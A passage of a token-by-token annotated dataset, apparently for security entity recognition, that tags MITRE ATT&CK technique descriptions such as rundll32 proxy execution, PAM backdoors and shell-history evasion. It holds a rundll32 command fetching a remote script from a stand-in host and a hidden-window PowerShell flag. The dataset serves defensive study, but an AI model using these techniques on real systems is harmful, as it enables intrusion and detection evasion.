rundll32.exe B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
code O
. O 

Using O
rundll32.exe B-TARGET_ASSET
, O
vice O
executing O
directly O
(i.e. O 

[Shared B-TARGET_ASSET
Modules](https://attack.mitre.org/techniques/T1129) I-TARGET_ASSET
) O
, O
may O
avoid O
triggering O
security B-TARGET_ASSET
tools I-TARGET_ASSET
that O
may O
not O
monitor O
execution O
of O
the O
rundll32.exe B-TARGET_ASSET
process I-TARGET_ASSET
because O
of O
allowlists O
or O
false O
positives O
from O
normal O
operations O
. O 

Rundll32.exe B-TARGET_ASSET
is O
commonly O
associated O
with O
executing O
DLL B-TARGET_ASSET
payloads I-TARGET_ASSET
(ex: O
<code>rundll32.exe O
{DLLname, O
DLLfunction}</code>) O
. O 

Rundll32.exe B-TARGET_ASSET
can O
also O
be O
used O
to O
execute O
[Control B-TARGET_ASSET
Panel](https://attack.mitre.org/techniques/T1218/002) I-TARGET_ASSET
Item I-TARGET_ASSET
files I-TARGET_ASSET
( I-TARGET_ASSET
.cpl I-TARGET_ASSET
) I-TARGET_ASSET
through O
the O
undocumented O
shell32.dll B-TARGET_ASSET
functions I-TARGET_ASSET
<code>Control_RunDLL</code> O
and O
<code>Control_RunDLLAsUser</code> O
. O 

Double-clicking O
a O
.cpl B-TARGET_ASSET
file I-TARGET_ASSET
also O
causes O
rundll32.exe B-TARGET_ASSET
to O
execute O
. O 

(Citation: O
Trend O
Micro O
CPL) O
For O
example O
, O
[ClickOnce](https://attack.mitre.org/techniques/T1127/002) O
can O
be O
proxied O
through O
Rundll32.exe B-TARGET_ASSET
. O 

Rundll32 O
can O
also O
be O
used O
to O
execute O
scripts B-TARGET_ASSET
such O
as O
JavaScript B-TARGET_ASSET
. O 

This O
can O
be O
done O
using O
a O
syntax O
similar O
to O
this: O
<code>rundll32.exe O
javascript:""\..\mshtml,RunHTMLApplication O
"";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> O
This O
behavior O
has O
been O
seen O
used O
by O
malware O
such O
as O
Poweliks O
. O 

(Citation: O
This O
is O
Security O
Command O
Line O
Confusion) O

Adversaries O
may O
also O
attempt O
to O
obscure O
malicious O
code O
from O
analysis O
by O
abusing O
the O
manner O
in O
which O
rundll32.exe B-TARGET_ASSET
loads O
DLL B-TARGET_ASSET
function I-TARGET_ASSET
names I-TARGET_ASSET
. O 

As O
part O
of O
Windows O
compatibility O
support O
for O
various O
character O
sets O
, O
rundll32.exe B-TARGET_ASSET
will O
first O
check O
for O
wide/Unicode O
then O
ANSI O
character-supported O
functions O
before O
loading O
the O
specified O
function O
(e.g., O
given O
the O
command O
<code>rundll32.exe O
ExampleDLL.dll, O
ExampleFunction</code> O
, O
rundll32.exe B-TARGET_ASSET
would O
first O
attempt O
to O
execute O
<code>ExampleFunctionW</code> O
, O
or O
failing O
that O
<code>ExampleFunctionA</code> O
, O
before O
loading O
<code>ExampleFunction</code>) O
. O 

Adversaries O
may O
therefore O
obscure O
malicious O
code O
by O
creating O
multiple O
identical O
exported O
function B-TARGET_ASSET
names I-TARGET_ASSET
and O
appending O
<code>W</code> O
and/or O
<code>A</code> O
to O
harmless O
ones O
. O 

(Citation: O
Attackify O
Rundll32.exe O
Obscurity)(Citation: O
Github O
NoRunDll) O
DLL B-TARGET_ASSET
functions I-TARGET_ASSET
can O
also O
be O
exported O
and O
executed O
by O
an O
ordinal O
number O
(ex: O
<code>rundll32.exe O
file.dll,#1</code>) O
. O 

Additionally O
, O
adversaries O
may O
use O
[Masquerading](https://attack.mitre.org/techniques/T1036) O
techniques O
(such O
as O
changing O
DLL O
file O
names O
, O
file O
extensions O
, O
or O
function O
names) O
to O
further O
conceal O
execution O
of O
a O
malicious O
payload O
. O 

(Citation: O
rundll32.exe O
defense O
evasion) O

Adversaries O
may O
attempt O
to O
discover O
containers B-TARGET_ASSET
and O
other O
resources O
that O
are O
available O
within O
a O
containers B-TARGET_ASSET
environment I-TARGET_ASSET
. O 

Other O
resources O
may O
include O
images B-TARGET_ASSET
, O
deployments B-TARGET_ASSET
, O
pods B-TARGET_ASSET
, O
nodes B-TARGET_ASSET
, O
and O
other O
information O
such O
as O
the O
status O
of O
a O
cluster B-TARGET_ASSET
. O 

These O
resources O
can O
be O
viewed O
within O
web B-TARGET_ASSET
applications I-TARGET_ASSET
such O
as O
the O
Kubernetes B-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
can O
be O
queried O
via O
the O
Docker B-TARGET_ASSET
and O
Kubernetes B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 

(Citation: O
Docker O
API)(Citation: O
Kubernetes O
API) O
In O
Docker O
, O
logs B-TARGET_ASSET
may O
leak O
information O
about O
the O
environment O
, O
such O
as O
the O
environment’s O
configuration O
, O
which O
services O
are O
available O
, O
and O
what O
cloud O
provider O
the O
victim O
may O
be O
utilizing O
. O 

The O
discovery O
of O
these O
resources O
may O
inform O
an O
adversary’s O
next O
steps O
in O
the O
environment O
, O
such O
as O
how O
to O
perform O
lateral O
movement O
and O
which O
methods O
to O
utilize O
for O
execution O
. O 

Adversaries O
may O
purchase O
and O
configure O
serverless B-TARGET_ASSET
cloud I-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
such O
as O
Cloudflare B-TARGET_ASSET
Workers I-TARGET_ASSET
, O
AWS B-TARGET_ASSET
Lambda I-TARGET_ASSET
functions I-TARGET_ASSET
, O
or O
Google B-TARGET_ASSET
Apps I-TARGET_ASSET
Scripts I-TARGET_ASSET
, O
that O
can O
be O
used O
during O
targeting O
. O 

By O
utilizing O
serverless B-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
adversaries O
can O
make O
it O
more O
difficult O
to O
attribute O
infrastructure B-TARGET_ASSET
used O
during O
operations O
back O
to O
them O
. O 

Once O
acquired O
, O
the O
serverless B-TARGET_ASSET
runtime I-TARGET_ASSET
environment I-TARGET_ASSET
can O
be O
leveraged O
to O
either O
respond O
directly O
to O
infected O
machines O
or O
to O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
traffic I-TARGET_ASSET
to O
an O
adversary-owned O
command O
and O
control O
server B-TARGET_ASSET
. O 

(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers)(Citation: O
AWS O
Lambda O
Redirector)(Citation: O
GWS O
Apps O
Script O
Abuse O
2021) O
As O
traffic O
generated O
by O
these O
functions O
will O
appear O
to O
come O
from O
subdomains O
of O
common O
cloud O
providers O
, O
it O
may O
be O
difficult O
to O
distinguish O
from O
ordinary O
traffic O
to O
these O
providers O
- O
making O
it O
easier O
to O
[Hide O
Infrastructure](https://attack.mitre.org/techniques/T1665) O
. O 

(Citation: O
Detecting O
Command O
& O
Control O
in O
the O
Cloud)(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers) O

Adversaries O
may O
implement O
hidden B-PRECON
windows B-TARGET_ASSET
to O
conceal O
malicious O
activity O
from O
the O
plain O
sight O
of O
users O
. O 

In O
some O
cases O
, O
windows B-TARGET_ASSET
that O
would O
typically O
be O
displayed O
when O
an O
application B-TARGET_ASSET
carries O
out O
an O
operation O
can O
be O
hidden B-PRECON
. O 

This O
may O
be O
utilized O
by O
system O
administrators O
to O
avoid O
disrupting O
user O
work O
environments O
when O
carrying O
out O
administrative O
tasks O
. O 

Adversaries O
may O
abuse O
operating B-TARGET_ASSET
system I-TARGET_ASSET
functionality O
to O
hide O
otherwise O
visible O
windows B-TARGET_ASSET
from O
users O
so O
as O
not O
to O
alert O
the O
user O
to O
adversary O
activity O
on O
the O
system B-TARGET_ASSET
. O 

### O
Windows O
There O
are O
a O
variety O
of O
features O
in O
scripting B-TARGET_ASSET
languages I-TARGET_ASSET
in O
Windows O
, O
such O
as O
[PowerShell](https://attack.mitre.org/techniques/T1086) B-TARGET_ASSET
, O
Jscript B-TARGET_ASSET
, O
and O
VBScript B-TARGET_ASSET
to O
make O
windows B-TARGET_ASSET
hidden B-PRECON
. O 

One O
example O
of O
this O
is O
<code>powershell.exe O
-WindowStyle O
Hidden</code> O
. O 

(Citation: O
PowerShell O
About O
2019) O

### O
Mac O
The O
configurations O
for O
how O
applications B-TARGET_ASSET
run O
on O
macOS O
are O
listed O
in O
property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
. O 

One O
of O
the O
tags O
in O
these O
files B-TARGET_ASSET
can O
be O
<code>apple.awt.UIElement</code> O
, O
which O
allows O
for O
Java O
applications B-TARGET_ASSET
to O
prevent O
the O
application's B-TARGET_ASSET
icon I-TARGET_ASSET
from O
appearing O
in O
the O
Dock B-TARGET_ASSET
. O 

A O
common O
use O
for O
this O
is O
when O
applications B-TARGET_ASSET
run O
in O
the O
system B-TARGET_ASSET
tray I-TARGET_ASSET
, O
but O
don't O
also O
want O
to O
show O
up O
in O
the O
Dock B-TARGET_ASSET
. O 

However O
, O
adversaries O
can O
abuse O
this O
feature O
and O
hide O
their O
running O
window B-TARGET_ASSET
. O 

(Citation: O
Antiquated O
Mac O
Malware) O

Mach-O B-TARGET_ASSET
binaries I-TARGET_ASSET
have O
a O
series O
of O
headers B-TARGET_ASSET
that O
are O
used O
to O
perform O
certain O
operations O
when O
a O
binary B-TARGET_ASSET
is O
loaded O
. O 

The O
LC_LOAD_DYLIB B-TARGET_ASSET
header I-TARGET_ASSET
in O
a O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
tells O
macOS O
and O
OS O
X O
which O
dynamic B-TARGET_ASSET
libraries I-TARGET_ASSET
( I-TARGET_ASSET
dylibs I-TARGET_ASSET
) O
to O
load O
during O
execution O
time O
. O 

These O
can O
be O
added O
ad-hoc O
to O
the O
compiled O
binary B-TARGET_ASSET
as O
long O
adjustments O
are O
made O
to O
the O
rest O
of O
the O
fields O
and O
dependencies O
(Citation: O
Writing O
Bad O
Malware O
for O
OSX) O
. O 

There O
are O
tools O
available O
to O
perform O
these O
changes O
. O 

Any O
changes O
will O
invalidate O
digital O
signatures O
on O
binaries B-TARGET_ASSET
because O
the O
binary B-TARGET_ASSET
is O
being O
modified B-PRECON
. O 

Adversaries O
can O
remediate O
this O
issue O
by O
simply O
removing O
the O
LC_CODE_SIGNATURE B-TARGET_ASSET
command I-TARGET_ASSET
from O
the O
binary B-TARGET_ASSET
so O
that O
the O
signature O
isn’t O
checked O
at O
load O
time O
(Citation: O
Malware O
Persistence O
on O
OS O
X) O
. O 

Adversaries O
may O
encode O
data B-TARGET_ASSET
with O
a O
standard O
data O
encoding O
system O
to O
make O
the O
content O
of O
command O
and O
control O
traffic B-TARGET_ASSET
more O
difficult O
to O
detect O
. O 

Command O
and O
control O
(C2) O
information B-TARGET_ASSET
can O
be O
encoded O
using O
a O
standard O
data O
encoding O
system O
that O
adheres O
to O
existing O
protocol B-TARGET_ASSET
specifications I-TARGET_ASSET
. O 

Common O
data O
encoding O
schemes O
include O
ASCII O
, O
Unicode O
, O
hexadecimal O
, O
Base64 O
, O
and O
MIME O
. O 

(Citation: O
Wikipedia O
Binary-to-text O
Encoding)(Citation: O
Wikipedia O
Character O
Encoding) O
Some O
data O
encoding O
systems O
may O
also O
result O
in O
data O
compression O
, O
such O
as O
gzip O
. O 

Adversaries O
may O
embed O
payloads B-TARGET_ASSET
within O
other O
files B-TARGET_ASSET
to O
conceal O
malicious O
content O
from O
defenses O
. O 

Otherwise O
seemingly O
benign O
files B-TARGET_ASSET
(such O
as O
scripts B-TARGET_ASSET
and O
executables B-TARGET_ASSET
) O
may O
be O
abused O
to O
carry O
and O
obfuscate O
malicious O
payloads B-TARGET_ASSET
and O
content O
. O 

In O
some O
cases O
, O
embedded B-PRECON
payloads B-TARGET_ASSET
may O
also O
enable O
adversaries O
to O
[Subvert O
Trust O
Controls](https://attack.mitre.org/techniques/T1553) O
by O
not O
impacting O
execution O
controls O
such O
as O
digital O
signatures O
and O
notarization O
tickets O
. O 

(Citation: O
Sentinel O
Labs) O

Adversaries O
may O
embed O
payloads B-TARGET_ASSET
in O
various O
file B-TARGET_ASSET
formats I-TARGET_ASSET
to O
hide O
payloads B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Learn) O
This O
is O
similar O
to O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
though O
does O
not O
involve O
weaving O
malicious O
content O
into O
specific O
bytes O
and O
patterns O
related O
to O
legitimate O
digital O
media O
formats O
. O 

(Citation: O
GitHub O
PSImage) O

For O
example O
, O
adversaries O
have O
been O
observed O
embedding O
payloads B-TARGET_ASSET
within O
or O
as O
an O
overlay O
of O
an O
otherwise O
benign O
binary B-TARGET_ASSET
. O 

(Citation: O
Securelist O
Dtrack2) O
Adversaries O
have O
also O
been O
observed O
nesting O
payloads B-TARGET_ASSET
(such O
as O
executables B-TARGET_ASSET
and O
run-only O
scripts B-TARGET_ASSET
) O
inside O
a O
file B-TARGET_ASSET
of O
the O
same O
format O
. O 

(Citation: O
SentinelLabs O
reversing O
run-only O
applescripts O
2021) O

Embedded B-PRECON
content B-TARGET_ASSET
may O
also O
be O
used O
as O
[Process O
Injection](https://attack.mitre.org/techniques/T1055) O
payloads B-TARGET_ASSET
used O
to O
infect O
benign O
system B-TARGET_ASSET
processes I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro) O
These O
embedded B-PRECON
then O
injected O
payloads B-TARGET_ASSET
may O
be O
used O
as O
part O
of O
the O
modules B-TARGET_ASSET
of O
malware B-TARGET_ASSET
designed O
to O
provide O
specific O
features O
such O
as O
encrypting O
C2 O
communications O
in O
support O
of O
an O
orchestrator O
module O
. O 

For O
example O
, O
an O
embedded B-TARGET_ASSET
module I-TARGET_ASSET
may O
be O
injected O
into O
default O
browsers B-TARGET_ASSET
, O
allowing O
adversaries O
to O
then O
communicate O
via O
the O
network B-TARGET_ASSET
. O 

(Citation: O
Malware O
Analysis O
Report O
ComRAT) O

Property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
contain O
all O
of O
the O
information O
that O
macOS O
and O
OS O
X O
uses O
to O
configure O
applications B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 


These O
files B-TARGET_ASSET
are O
UTF-8 B-PRECON
encoded I-PRECON
and O
formatted B-PRECON
like I-PRECON
XML I-PRECON
documents I-PRECON
via O
a O
series O
of O
keys O
surrounded O
by O
< O
> O
. O 


They O
detail O
when O
programs O
should O
execute O
, O
file O
paths O
to O
the O
executables O
, O
program O
arguments O
, O
required O
OS O
permissions O
, O
and O
many O
others O
plists B-TARGET_ASSET
are O
located O
in O
certain O
locations O
depending O
on O
their O
purpose O
such O
as O
<code>/Library/Preferences</code> O
(which O
execute O
with O
elevated O
privileges) O
and O
<code>~/Library/Preferences</code> O
(which O
execute O
with O
a O
user's O
privileges) O
. O 


Adversaries O
can O
modify O
these O
plist B-TARGET_ASSET
files I-TARGET_ASSET
to O
point O
to O
their O
own O
code O
, O
can O
use O
them O
to O
execute O
their O
code O
in O
the O
context O
of O
another O
user O
, O
bypass O
whitelisting O
procedures O
, O
or O
even O
use O
them O
as O
a O
persistence O
mechanism O
. O 


(Citation: O
Sofacy O
Komplex O
Trojan) O

Adversaries O
may O
modify O
pluggable B-TARGET_ASSET
authentication I-TARGET_ASSET
modules I-TARGET_ASSET
( I-TARGET_ASSET
PAM I-TARGET_ASSET
) I-TARGET_ASSET
to O
access O
user O
credentials B-TARGET_ASSET
or O
enable O
otherwise O
unwarranted O
access O
to O
accounts O
. O 


PAM B-TARGET_ASSET
is O
a O
modular O
system O
of O
configuration B-TARGET_ASSET
files I-TARGET_ASSET
, O
libraries B-TARGET_ASSET
, O
and O
executable B-TARGET_ASSET
files I-TARGET_ASSET
which O
guide O
authentication O
for O
many O
services B-TARGET_ASSET
. O 


The O
most O
common O
authentication B-TARGET_ASSET
module I-TARGET_ASSET
is O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
which O
retrieves O
, O
sets O
, O
and O
verifies O
account O
authentication O
information O
in O
<code>/etc/passwd</code> B-TARGET_ASSET
and O
<code>/etc/shadow</code> B-TARGET_ASSET
. O 

(Citation: O
Apple O
PAM)(Citation: O
Man O
Pam_Unix)(Citation: O
Red O
Hat O
PAM) O

Adversaries O
may O
modify O
components O
of O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
to O
create O
backdoors O
. O 


PAM B-TARGET_ASSET
components I-TARGET_ASSET
, O
such O
as O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
can O
be O
patched B-PRECON
to O
accept O
arbitrary O
adversary O
supplied O
values O
as O
legitimate O
credentials O
. O 

(Citation: O
PAM O
Backdoor) O

Malicious O
modifications O
to O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
may O
also O
be O
abused O
to O
steal O
credentials B-TARGET_ASSET
. O 


Adversaries O
may O
infect O
PAM B-TARGET_ASSET
resources I-TARGET_ASSET
with O
code O
to O
harvest O
user O
credentials B-TARGET_ASSET
, O
since O
the O
values O
exchanged O
with O
PAM B-TARGET_ASSET
components I-TARGET_ASSET
may O
be O
plain-text B-PRECON
since O
PAM B-TARGET_ASSET
does O
not O
store O
passwords O
. O 

(Citation: O
PAM O
Creds)(Citation: O
Apple O
PAM) O

An O
adversary O
may O
revert O
changes O
made O
to O
a O
cloud B-TARGET_ASSET
instance I-TARGET_ASSET
after O
they O
have O
performed O
malicious O
activities O
in O
attempt O
to O
evade O
detection O
and O
remove O
evidence O
of O
their O
presence O
. O 


In O
highly O
virtualized O
environments O
, O
such O
as O
cloud-based O
infrastructure B-TARGET_ASSET
, O
this O
may O
be O
accomplished O
by O
restoring O
virtual B-TARGET_ASSET
machine I-TARGET_ASSET
( I-TARGET_ASSET
VM I-TARGET_ASSET
) I-TARGET_ASSET
or O
data B-TARGET_ASSET
storage I-TARGET_ASSET
snapshots I-TARGET_ASSET
through O
the O
cloud B-TARGET_ASSET
management I-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
cloud B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 


Another O
variation O
of O
this O
technique O
is O
to O
utilize O
temporary B-TARGET_ASSET
storage I-TARGET_ASSET
attached O
to O
the O
compute B-TARGET_ASSET
instance I-TARGET_ASSET
. O 


Most O
cloud O
providers O
provide O
various O
types O
of O
storage B-TARGET_ASSET
including O
persistent O
, O
local O
, O
and/or O
ephemeral B-PRECON
, O
with O
the O
ephemeral O
types O
often O
reset B-PRECON
upon I-PRECON
stop/restart I-PRECON
of I-PRECON
the I-PRECON
VM B-TARGET_ASSET
. O 

(Citation: O
Tech O
Republic O
- O
Restore O
AWS O
Snapshots)(Citation: O
Google O
- O
Restore O
Cloud O
Snapshot) O

The O
<code>HISTCONTROL</code> B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
keeps O
track O
of O
what O
should O
be O
saved O
by O
the O
<code>history</code> O
command O
and O
eventually O
into O
the O
<code>~/.bash_history</code> B-TARGET_ASSET
file I-TARGET_ASSET
when O
a O
user O
logs O
out O
. O 


This O
setting O
can O
be O
configured B-PRECON
to O
ignore O
commands O
that O
start O
with O
a O
space O
by O
simply O
setting O
it O
to O
""ignorespace"" O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
can O
also O
be O
set O
to O
ignore O
duplicate O
commands O
by O
setting O
it O
to O
""ignoredups"" O
. O 


In O
some O
Linux O
systems O
, O
this O
is O
set B-PRECON
by I-PRECON
default I-PRECON
to I-PRECON
""ignoreboth"" I-PRECON
which O
covers O
both O
of O
the O
previous O
examples O
. O 


This O
means O
that O
“ O
ls” O
will O
not O
be O
saved O
, O
but O
“ls” O
would O
be O
saved O
by O
history O
. O 


<code>HISTCONTROL</code> B-TARGET_ASSET
does O
not O
exist B-PRECON
by I-PRECON
default I-PRECON
on O
macOS O
, O
but O
can O
be O
set O
by O
the O
user O
and O
will O
be O
respected O
. O 


Adversaries O
can O
use O
this O
to O
operate O
without O
leaving O
traces O
by O
simply O
prepending O
a O
space O
to O
all O
of O
their O
terminal O
commands O
. O 


Adversaries O
may O
gather O
information O
about O
the O
victim's O
hosts B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
hosts B-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
including O
administrative O
data O
(ex: O
name O
, O
assigned O
IP O
, O
functionality O
, O
etc.) O
as O
well O
as O
specifics O
regarding O
its O
configuration O
(ex: O
operating O
system O
, O
language O
, O
etc.) O
. O 

Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 

Adversaries O
may O
also O
compromise O
sites B-TARGET_ASSET
then O
include O
malicious O
content O
designed O
to O
collect O
host B-TARGET_ASSET
information I-TARGET_ASSET
from O
visitors O
. O 


(Citation: O
ATT O
ScanBox) O
Information O
about O
hosts B-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Social O
Media](https://attack.mitre.org/techniques/T1593/001) O
or O
[Search O
Victim-Owned O
Websites](https://attack.mitre.org/techniques/T1594)) O
. O 


Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593) O
or O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[Supply O
Chain O
Compromise](https://attack.mitre.org/techniques/T1195) O
or O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
also O
gather O
victim O
host B-TARGET_ASSET
information I-TARGET_ASSET
via O
User-Agent B-TARGET_ASSET
HTTP I-TARGET_ASSET
headers I-TARGET_ASSET
, O
which O
are O
sent O
to O
a O
server B-TARGET_ASSET
to O
identify O
the O
application B-TARGET_ASSET
, O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
vendor O
, O
and/or O
version O
of O
the O
requesting O
user O
agent O
. O 

This O
can O
be O
used O
to O
inform O
the O
adversary’s O
follow-on O
action O
. O 


For O
example O
, O
adversaries O
may O
check O
user O
agents O
for O
the O
requesting O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
then O
only O
serve O
malware B-TARGET_ASSET
for O
target O
operating B-TARGET_ASSET
systems I-TARGET_ASSET
while O
ignoring O
others O
. O 


(Citation: O
TrellixQakbot) O

Adversaries O
may O
search O
public O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
for O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 


Digital B-TARGET_ASSET
certificates I-TARGET_ASSET
are O
issued O
by O
a O
certificate O
authority O
(CA) O
in O
order O
to O
cryptographically O
verify O
the O
origin O
of O
signed O
content O
. O 


These O
certificates B-TARGET_ASSET
, O
such O
as O
those O
used O
for O
encrypted O
web O
traffic B-TARGET_ASSET
(HTTPS O
SSL/TLS O
communications O
) O
, O
contain O
information O
about O
the O
registered O
organization O
such O
as O
name O
and O
location O
. O 


Adversaries O
may O
use O
scripts B-TARGET_ASSET
automatically B-PRECON
executed I-PRECON
at I-PRECON
boot I-PRECON
or I-PRECON
logon I-PRECON
initialization I-PRECON
to O
establish O
persistence O
. O 


(Citation: O
Mandiant O
APT29 O
Eye O
Spy O
Email O
Nov O
22)(Citation: O
Anomali O
Rocke O
March O
2019) O
Initialization B-TARGET_ASSET
scripts I-TARGET_ASSET
can O
be O
used O
to O
perform O
administrative O
functions O
, O
which O
may O
often O
execute O
other O
programs O
or O
send O
information O
to O
an O
internal O
logging B-TARGET_ASSET
server I-TARGET_ASSET
. O 


These O
scripts B-TARGET_ASSET
can O
vary O
based O
on O
operating B-TARGET_ASSET
system I-TARGET_ASSET
and O
whether O
applied O
locally O
or O
remotely O
. O 


Adversaries O
may O
use O
these O
scripts B-TARGET_ASSET
to O
maintain O
persistence O
on O
a O
single O
system B-TARGET_ASSET
. O 


Depending O
on O
the O
access O
configuration O
of O
the O
logon B-TARGET_ASSET
scripts I-TARGET_ASSET
, O
either O
local O
credentials B-TARGET_ASSET
or O
an O
administrator O
account O
may O
be O
necessary O
. O 


An O
adversary O
may O
also O
be O
able O
to O
escalate O
their O
privileges O
since O
some O
boot B-TARGET_ASSET
or O
logon B-TARGET_ASSET
initialization I-TARGET_ASSET
scripts I-TARGET_ASSET
run B-PRECON
with I-PRECON
higher I-PRECON
privileges I-PRECON
. O 


Adversaries O
may O
attempt O
to O
position O
themselves O
between O
two O
or O
more O
networked O
devices B-TARGET_ASSET
using O
an O
adversary-in-the-middle O
(AiTM) O
technique O
to O
support O
follow-on O
behaviors O
such O
as O
[Network O
Sniffing](https://attack.mitre.org/techniques/T1040) O
, O
[Transmitted O
Data O
Manipulation](https://attack.mitre.org/techniques/T1565/002) O
, O
or O
replay O
attacks O
([Exploitation O
for O
Credential O
Access](https://attack.mitre.org/techniques/T1212)) O
. O 


By O
abusing O
features O
of O
common O
networking B-TARGET_ASSET
protocols I-TARGET_ASSET
that O
can O
determine O
the O
flow O
of O
network O
traffic B-TARGET_ASSET
(e.g. O 

ARP B-TARGET_ASSET
, O
DNS B-TARGET_ASSET
, O
LLMNR B-TARGET_ASSET
, O
etc.) O
, O
adversaries O
may O
force O
a O
device B-TARGET_ASSET
to O
communicate O
through O
an O
adversary O
controlled O
system B-TARGET_ASSET
so O
they O
can O
collect O
information O
or O
perform O
additional O
actions O
. O 

(Citation: O
Rapid7 O
MiTM O
Basics) O

For O
example O
, O
adversaries O
may O
manipulate O
victim O
DNS B-TARGET_ASSET
settings I-TARGET_ASSET
to O
enable O
other O
malicious O
activities O
such O
as O
preventing/redirecting O
users O
from O
accessing O
legitimate O
sites O
and/or O
pushing O
additional O
malware O
. O 


(Citation: O
ttint_rat)(Citation: O
dns_changer_trojans)(Citation: O
ad_blocker_with_miner) O
Adversaries O
may O
also O
manipulate O
DNS B-TARGET_ASSET
and O
leverage O
their O
position O
in O
order O
to O
intercept O
user O
credentials B-TARGET_ASSET
, O
including O
access B-TARGET_ASSET
tokens I-TARGET_ASSET
([Steal O
Application O
Access O
Token](https://attack.mitre.org/techniques/T1528)) O
and O
session B-TARGET_ASSET
cookies I-TARGET_ASSET
([Steal O
Web O
Session O
Cookie](https://attack.mitre.org/techniques/T1539)) O
. O 


(Citation: O
volexity_0day_sophos_FW)(Citation: O
Token O
tactics) O
[Downgrade O
Attack](https://attack.mitre.org/techniques/T1562/010)s O
can O
also O
be O
used O
to O
establish O
an O
AiTM O
position O
, O
such O
as O
by O
negotiating O
a O
less B-PRECON
secure I-PRECON
, O
deprecated B-PRECON
, O
or O
weaker B-PRECON
version O
of O
communication B-TARGET_ASSET
protocol I-TARGET_ASSET
(SSL/TLS) O
or O
encryption B-TARGET_ASSET
algorithm I-TARGET_ASSET
. O 

(Citation: O
mitm_tls_downgrade_att)(Citation: O
taxonomy_downgrade_att_tls)(Citation: O
tlseminar_downgrade_att) O

Adversaries O
may O
also O
leverage O
the O
AiTM O
position O
to O
attempt O
to O
monitor O
and/or O
modify O
traffic B-TARGET_ASSET
, O
such O
as O
in O
[Transmitted O
Data O
Manipulation](https://attack.mitre.org/techniques/T1565/002) O
. O 


Adversaries O
can O
setup O
a O
position O
similar O
to O
AiTM O
to O
prevent O
traffic B-TARGET_ASSET
from O
flowing O
to O
the O
appropriate O
destination O
, O
potentially O
to O
[Impair O
Defenses](https://attack.mitre.org/techniques/T1562) O
and/or O
in O
support O
of O
a O
[Network O
Denial O
of O
Service](https://attack.mitre.org/techniques/T1498) O
. O 


Adversaries O
may O
attempt O
to O
identify O
the O
primary O
user O
, O
currently O
logged O
in O
user O
, O
set O
of O
users O
that O
commonly O
uses O
a O
system B-TARGET_ASSET
, O
or O
whether O
a O
user O
is O
actively O
using O
the O
system B-TARGET_ASSET
. O 


They O
may O
do O
this O
, O
for O
example O
, O
by O
retrieving O
account B-TARGET_ASSET
usernames I-TARGET_ASSET
or O
by O
using O
[OS B-TARGET_ASSET
Credential I-TARGET_ASSET
Dumping](https://attack.mitre.org/techniques/T1003) I-TARGET_ASSET
. O 


The O
information O
may O
be O
collected O
in O
a O
number O
of O
different O
ways O
using O
other O
Discovery O
techniques O
, O
because O
user O
and O
username O
details O
are O
prevalent O
throughout O
a O
system B-TARGET_ASSET
and O
include O
running O
process O
ownership O
, O
file/directory O
ownership O
, O
session O
information O
, O
and O
system B-TARGET_ASSET
logs I-TARGET_ASSET
. O 


Adversaries O
may O
use O
the O
information O
from O
[System O
Owner/User O
Discovery](https://attack.mitre.org/techniques/T1033) O
during O
automated O
discovery O
to O
shape O
follow-on O
behaviors O
, O
including O
whether O
or O
not O
the O
adversary O
fully O
infects O
the O
target O
and/or O
attempts O
specific O
actions O
. O 


Various O
utilities B-TARGET_ASSET
and O
commands O
may O
acquire O
this O
information O
, O
including O
<code>whoami</code> O
. O 

In O
macOS O
and O
Linux O
, O
the O
currently O
logged O
in O
user O
can O
be O
identified O
with O
<code>w</code> O
and O
<code>who</code> O
. O 


On O
macOS O
the O
<code>dscl O
. O 

list O
/Users O
| O
grep O
-v O
'_'</code> O
command O
can O
also O
be O
used O
to O
enumerate O
user O
accounts B-TARGET_ASSET
. O 

Environment B-TARGET_ASSET
variables I-TARGET_ASSET
, O
such O
as O
